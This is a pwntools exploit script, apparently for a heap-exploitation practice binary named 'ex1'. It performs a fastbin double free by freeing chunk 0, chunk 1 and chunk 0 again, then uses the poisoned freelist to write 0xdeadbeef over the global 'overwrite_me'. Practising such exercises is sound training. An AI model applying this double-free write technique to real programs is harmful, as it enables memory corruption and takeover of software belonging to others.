from pwn import *
context.terminal = ['tmux', '-x', 'sh', '-c'] 
context.update(log_level = 'debug')

p = process('ex1')
elf = ELF('ex1')
addr_gVar = elf.symbols['overwrite_me']
log.info('gVar : ' + hex(addr_gVar))

#name
p.recvrepeat(0.2)
p.sendline(p64(0) + p64(0x30))

#chunk 1 
p.recvrepeat(0.2)
p.sendline('1')
p.recvrepeat(0.2)
p.sendline('aaa')
#chunk 2
p.recvrepeat(0.2)
p.sendline('1')
p.recvrepeat(0.2)
p.sendline('bbb')
#free chunk 1
p.recvrepeat(0.2)
p.sendline('2')
p.recvrepeat(0.2)
p.sendline('0')
#free chunk 2
p.recvrepeat(0.2)
p.sendline('2')
p.recvrepeat(0.2)
p.sendline('1')
#free chunk 1
p.recvrepeat(0.2)
p.sendline('2')
p.recvrepeat(0.2)
p.sendline('0')

#allocate chunk 1 
#overwrite chunk 1 with address of overwrite_me
p.recvrepeat(0.2)
p.sendline('1')
p.recvrepeat(0.2)
p.sendline(p64(addr_gVar-0x10))
#gdb.attach(p)

p.recvrepeat(0.2)
p.sendline('1')
p.recvrepeat(0.2)
p.sendline('dummy')
p.recvrepeat(0.2)
p.sendline('1')
p.recvrepeat(0.2)
p.sendline(p64(addr_gVar-0x10))

p.recvrepeat(0.2)
p.sendline('1')
p.recvrepeat(0.2)
p.sendline(p64(0xdeadbeef))
p.recvrepeat(0.2)
p.sendline('3')
p.interactive()
